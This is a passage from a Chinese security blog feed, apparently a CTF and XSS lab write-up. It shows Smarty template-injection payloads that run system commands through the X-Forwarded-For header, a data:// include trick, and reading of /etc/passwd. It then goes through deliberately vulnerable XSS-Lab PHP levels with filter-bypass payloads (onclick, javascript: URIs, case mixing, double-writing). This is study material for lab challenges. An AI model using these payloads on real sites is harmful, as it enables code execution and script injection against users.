class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://plain/text,I have a dream</span><br></pre></td></tr></table></figure><p>我通过include将&#x2F;etc&#x2F;passwd泄露出来，发现有nginx，猜测是nginx服务，利用日志包含。</p><img src="/CTFwp/BJDCTF-2020/image-2.png" class=""><p>说一说我这道题咋碰壁的，我当时看到file_get_content函数，以及这个形式，我还以为是考察的是filter链，真没想到，是我想的复杂了，反正filter我是没弄出来，后面想到data:&#x2F;&#x2F;协议也可以这样。</p><p>data:&#x2F;&#x2F;协议，需要php.ini开启<code>allow_url_fopen、allow_url_include</code>。</p><h2 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h2><p>咋说这道题了，我都忘记了我当时是怎么做的。</p><p>我当时就做到<code>X-Forwarded-For</code>，我输入什么，它回显什么，smarty模板注入当时我也没有学习，现在学习了，我们来看看这道题。</p><p>题目以IP作为出入点，我想到了<code>X-Forwarded-For</code>，我们先要判断它是什么模板引擎。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:$&#123;7*7&#125;</span><br></pre></td></tr></table></figure><img src="/CTFwp/BJDCTF-2020/image-3.png" class=""><p>可以执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:a&#123;*comment*&#125;b</span><br></pre></td></tr></table></figure><img src="/CTFwp/BJDCTF-2020/image-4.png" class=""><p>可以执行，说明其是smarty模板引擎。我们对症下药即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:&#123;$smarty.version&#125;</span><br></pre></td></tr></table></figure><img src="/CTFwp/BJDCTF-2020/image-5.png" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:&#123;system(&#x27;ls /&#x27;)&#125;</span><br></pre></td></tr></table></figure><img src="/CTFwp/BJDCTF-2020/image-6.png" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:&#123;system(&#x27;cat /f*&#x27;)&#125;</span><br></pre></td></tr></table></figure><img src="/CTFwp/BJDCTF-2020/image-7.png" class="">]]></content>
      
      
      <categories>
          
          <category> CTFwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS-Lab</title>
      <link href="/XSS/XSS-Lab/"/>
      <url>/XSS/XSS-Lab/</url>
      
        <content type="html"><![CDATA[<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;!--STATUS OK--&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        // 重写alert函数</span><br><span class="line">        window.alert = function() &#123;     </span><br><span class="line">            confirm(&quot;完成的不错！&quot;);</span><br><span class="line">            window.location.href = &quot;level2.php?keyword=test&quot;; </span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;title&gt;欢迎来到level1&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1 align=&quot;center&quot;&gt;欢迎来到level1&lt;/h1&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;?php </span><br><span class="line">    // 关闭错误显示</span><br><span class="line">    ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">    </span><br><span class="line">    // 获取GET参数name的值</span><br><span class="line">    $str = $_GET[&quot;name&quot;];</span><br><span class="line">    </span><br><span class="line">    // 输出欢迎用户信息</span><br><span class="line">    echo &quot;&lt;h2 align=&#x27;center&#x27;&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</span><br><span class="line">    ?&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;center&gt;&lt;img src=&quot;level1.png&quot;&gt;&lt;/center&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;?php </span><br><span class="line">    // 显示payload的长度</span><br><span class="line">    echo &quot;&lt;h3 align=&#x27;center&#x27;&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>没有什么过滤，调用alert()就可以进入下一关。</p><img src="/XSS/XSS-Lab/image-20250722101159579.png" class="" title="image-20250722101159579"><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;!--STATUS OK--&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        // 重写alert函数</span><br><span class="line">        window.alert = function() &#123;     </span><br><span class="line">            confirm(&quot;完成的不错！&quot;);</span><br><span class="line">            window.location.href = &quot;level3.php?writing=wait&quot;; </span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;title&gt;欢迎来到level2&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1 align=&quot;center&quot;&gt;欢迎来到level2&lt;/h1&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;?php </span><br><span class="line">    // 关闭错误显示</span><br><span class="line">    ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">    </span><br><span class="line">    // 获取GET参数keyword的值</span><br><span class="line">    $str = $_GET[&quot;keyword&quot;];</span><br><span class="line">    </span><br><span class="line">    // 输出搜索结果和搜索表单</span><br><span class="line">    echo &quot;&lt;h2 align=&#x27;center&#x27;&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">    &lt;form action=&quot;level2.php&quot; method=&quot;GET&quot;&gt;</span><br><span class="line">        &lt;input name=&quot;keyword&quot; value=&quot;&#x27;.$str.&#x27;&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;搜索&quot;/&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;/center&gt;&#x27;;</span><br><span class="line">    // htmlspecialchars — 将特殊字符转换为 HTML 实体</span><br><span class="line">    ?&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;center&gt;&lt;img src=&quot;level2.png&quot;&gt;&lt;/center&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;?php </span><br><span class="line">    // 显示payload的长度</span><br><span class="line">    echo &quot;&lt;h3 align=&#x27;center&#x27;&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>方法1：</p><p><code>&quot;&gt; &lt;script&gt;alert(1)&lt;/script&gt; &lt;&quot;</code></p><p>方法2：</p><p><code>input标签里面的str没有调用htmlspecialchars，我们只需要闭合引号，插入可以执行JavaScript属性的代码即可。</code></p><img src="/XSS/XSS-Lab/image-20250722101913795.png" class="" title="image-20250722101913795"><p>注意：插入内容后，要点击搜索框，才会执行我们插入的恶意payload。</p><h2 id="level3-绕过htmlspecialchars"><a href="#level3-绕过htmlspecialchars" class="headerlink" title="level3(绕过htmlspecialchars())"></a>level3(绕过htmlspecialchars())</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;欢迎来到level3&lt;/title&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        window.alert = function() &#123;</span><br><span class="line">            confirm(&quot;完成的不错！&quot;);</span><br><span class="line">            window.location.href = &quot;level4.php?keyword=try harder!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1 style=&quot;text-align:center&quot;&gt;欢迎来到level3&lt;/h1&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;?php</span><br><span class="line">    ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">    $str = $_GET[&quot;keyword&quot;] ?? &#x27;&#x27;;</span><br><span class="line">    ?&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;h2 style=&quot;text-align:center&quot;&gt;没有找到和&lt;?=htmlspecialchars($str)?&gt;相关的结果。&lt;/h2&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;div style=&quot;text-align:center&quot;&gt;</span><br><span class="line">        &lt;form action=&quot;level3.php&quot; method=&quot;GET&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;text&quot; name=&quot;keyword&quot; value=&#x27;&quot;&lt;?=htmlspecialchars($str)?&gt;&quot;&#x27;&gt;</span><br><span class="line">            &lt;input type=&quot;submit&quot; value=&quot;搜索&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;div style=&quot;text-align:center&quot;&gt;</span><br><span class="line">        &lt;img src=&quot;level3.png&quot; alt=&quot;Level 3&quot;&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;h3 style=&quot;text-align:center&quot;&gt;payload的长度:&lt;?=strlen($str)?&gt;&lt;/h3&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>htmlspecialchars()函数会把一些预定义的字符转换为HTML实体</p><table><thead><tr><th>预定义字符</th><th>实体</th></tr></thead><tbody><tr><td>&amp;</td><td><code>&amp;amp;</code></td></tr><tr><td>“</td><td><code>&amp;quot;</code></td></tr><tr><td>‘</td><td>‘</td></tr><tr><td>&lt;</td><td><code>&amp;lt;</code></td></tr><tr><td>&gt;</td><td><code>&amp;gt;</code></td></tr></tbody></table><p>php8.10以下可以使用此漏洞，8.10以上修复了此漏洞。</p><p><code>keyword=&#39; onclick=&#39;alert(1)</code></p><img src="/XSS/XSS-Lab/image-20250722111543244.png" class="" title="image-20250722111543244"><p>发送以后，点击搜索框，会触发onclick，并执行。</p><h2 id="level4-过滤"><a href="#level4-过滤" class="headerlink" title="level4(&lt; &gt; 过滤)"></a>level4(&lt; &gt; 过滤)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;!--STATUS OK--&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        window.alert = function() &#123;     </span><br><span class="line">            confirm(&quot;完成的不错！&quot;);</span><br><span class="line">            window.location.href = &quot;level5.php?keyword=find a way out!&quot;; </span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;title&gt;欢迎来到level4&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1 align=&quot;center&quot;&gt;欢迎来到level4&lt;/h1&gt;</span><br><span class="line">    &lt;?php </span><br><span class="line">    ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">    $str = $_GET[&quot;keyword&quot;];</span><br><span class="line">    $str2 = str_replace(&quot;&gt;&quot;, &quot;&quot;, $str); </span><br><span class="line">    $str3 = str_replace(&quot;&lt;&quot;, &quot;&quot;, $str2); // 过滤了&lt; &gt;</span><br><span class="line">    echo &quot;&lt;h2 align=&#x27;center&#x27;&gt;没有找到和&quot; . htmlspecialchars($str) . &quot;相关的结果.&lt;/h2&gt;&quot; . &#x27;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">        &lt;form action=&quot;level4.php&quot; method=&quot;GET&quot;&gt;</span><br><span class="line">            &lt;input name=&quot;keyword&quot; value=&quot;&#x27; . $str3 . &#x27;&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;搜索&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/center&gt;&#x27;;</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;center&gt;&lt;img src=&quot;level4.png&quot;&gt;&lt;/center&gt;</span><br><span class="line">    &lt;?php </span><br><span class="line">    echo &quot;&lt;h3 align=&#x27;center&#x27;&gt;payload的长度:&quot; . strlen($str3) . &quot;&lt;/h3&gt;&quot;;</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><img src="/XSS/XSS-Lab/image-20250722112113438.png" class="" title="image-20250722112113438"><p>建议还是利用onclick。</p><h2 id="level5-过滤"><a href="#level5-过滤" class="headerlink" title="level5(过滤&lt;script 和 on)"></a>level5(过滤&lt;script 和 on)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        window.alert = function() &#123;     </span><br><span class="line">            confirm(&quot;完成的不错！&quot;);</span><br><span class="line">            window.location.href=&quot;level6.php?keyword=break it out!&quot;; </span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;title&gt;欢迎来到level5&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1 align=&quot;center&quot;&gt;欢迎来到level5&lt;/h1&gt;</span><br><span class="line">    &lt;?php </span><br><span class="line">    ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">    $str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">    $str2 = str_replace(&quot;&lt;script&quot;, &quot;&lt;scr_ipt&quot;, $str); </span><br><span class="line">    $str3 = str_replace(&quot;on&quot;, &quot;o_n&quot;, $str2); // 添加_</span><br><span class="line">    echo &quot;&lt;h2 align=&#x27;center&#x27;&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">        &lt;form action=&quot;level5.php&quot; method=&quot;GET&quot;&gt;</span><br><span class="line">            &lt;input name=&quot;keyword&quot; value=&quot;&#x27;.$str3.&#x27;&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;搜索&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">        &lt;/center&gt;&#x27;;</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;center&gt;&lt;img src=&quot;level5.png&quot;&gt;&lt;/center&gt;</span><br><span class="line">    &lt;?php </span><br><span class="line">    echo &quot;&lt;h3 align=&#x27;center&#x27;&gt;payload的长度:&quot;.strlen($str3).&quot;&lt;/h3&gt;&quot;;</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>可以利用javascript伪协议，javascript:可以执行代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=&quot;&gt; &lt;a href=javascript:alert(1) /&gt; &lt;&quot;</span><br></pre></td></tr></table></figure><h2 id="level6-大小写绕过"><a href="#level6-大小写绕过" class="headerlink" title="level6(大小写绕过)"></a>level6(大小写绕过)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;!--STATUS OK--&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        window.alert = function() &#123;     </span><br><span class="line">            confirm(&quot;完成的不错！&quot;);</span><br><span class="line">            window.location.href=&quot;level7.php?keyword=move up!&quot;; </span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;title&gt;欢迎来到level6&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1 align=&quot;center&quot;&gt;欢迎来到level6&lt;/h1&gt;</span><br><span class="line">    &lt;?php </span><br><span class="line">    ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">    $str = $_GET[&quot;keyword&quot;];</span><br><span class="line">    $str2 = str_replace(&quot;&lt;script&quot;, &quot;&lt;scr_ipt&quot;, $str);</span><br><span class="line">    $str3 = str_replace(&quot;on&quot;, &quot;o_n&quot;, $str2);</span><br><span class="line">    $str4 = str_replace(&quot;src&quot;, &quot;sr_c&quot;, $str3);</span><br><span class="line">    $str5 = str_replace(&quot;data&quot;, &quot;da_ta&quot;, $str4);</span><br><span class="line">    $str6 = str_replace(&quot;href&quot;, &quot;hr_ef&quot;, $str5);</span><br><span class="line">    echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">    &lt;form action=level6.php method=GET&gt;</span><br><span class="line">    &lt;input name=keyword value=&quot;&#x27;.$str6.&#x27;&quot;&gt;</span><br><span class="line">    &lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;/center&gt;&#x27;;</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;center&gt;&lt;img src=level6.png&gt;&lt;/center&gt;</span><br><span class="line">    &lt;?php </span><br><span class="line">    echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str6).&quot;&lt;/h3&gt;&quot;;</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>HTML不区分大小写，用大小写绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keyword=&quot; Onclick=&quot;alert(1)</span><br><span class="line">keyword=&quot;&gt;&lt;a Href=javascript:alert(1)&gt;&lt;&quot;</span><br></pre></td></tr></table></figure><h2 id="level7-双写绕过"><a href="#level7-双写绕过" class="headerlink" title="level7(双写绕过)"></a>level7(双写绕过)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;!--STATUS OK--&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        window.alert = function() &#123;     </span><br><span class="line">            confirm(&quot;完成的不错！&quot;);</span><br><span class="line">            window.location.href=&quot;level8.php?keyword=nice try!&quot;; </span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;title&gt;欢迎来到level7&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1 align=&quot;center&quot;&gt;欢迎来到level7&lt;/h1&gt;</span><br><span class="line">    &lt;?php </span><br><span class="line">    ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">    $str = strtolower($_GET[&quot;keyword&quot;]); // 转化为小写</span><br><span class="line">    $str2 = str_replace(&quot;script&quot;, &quot;&quot;, $str);</span><br><span class="line">    $str3 = str_replace(&quot;on&quot;, &quot;&quot;, $str2);</span><br><span class="line">    $str4 = str_replace(&quot;src&quot;, &quot;&quot;, $str3);</span><br><span class="line">    $str5 = str_replace(&quot;data&quot;, &quot;&quot;, $str4);</span><br><span class="line">    $str6 = str_replace(&quot;href&quot;, &quot;&quot;, $str5);</span><br><span class="line">    echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">    &lt;form action=level7.php method=GET&gt;</span><br><span class="line">    &lt;input name=keyword value=&quot;&#x27;.$str6.&#x27;&quot;&gt;</span><br><span class="line">    &lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;/center&gt;&#x27;;</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;center&gt;&lt;img src=level7.png&gt;&lt;/center&gt;</span><br><span class="line">    &lt;?php </span><br><span class="line">    echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str6).&quot;&lt;/h3&gt;&quot;;</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>只进行了一次替换，可以通过双写绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=&quot; oonnclick=&quot;alert(1)</span><br></pre></td></tr></table></figure><h2 id="level8-实体绕过"><a href="#level8-实体绕过" class="headerlink" title="level8(实体绕过)"></a>level8(实体绕过)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;!--STATUS OK--&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    